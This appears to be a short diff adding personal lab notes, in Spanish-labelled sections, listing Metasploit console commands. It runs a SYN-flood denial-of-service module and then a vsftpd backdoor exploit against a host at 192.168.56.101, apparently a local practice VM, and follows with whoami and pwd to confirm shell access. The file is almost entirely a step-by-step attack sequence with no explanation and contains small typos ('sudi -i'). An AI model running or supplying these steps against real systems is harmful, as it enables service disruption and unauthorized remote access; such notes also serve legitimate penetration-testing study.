@@ -1,0 +1,21 @@
+#Ataque DoS:
+
+sudo -i
+sudo msfdb init && msfconsole
+search dos synflood
+use 0
+info
+set rhosts 192.168.56.101
+run
+
+#Backdoor
+sudi -i
+msfconsole
+search vsftp
+use 1
+info
+set rhosts
+set rhosts 192.168.56.101
+run
+whoami
+pwd
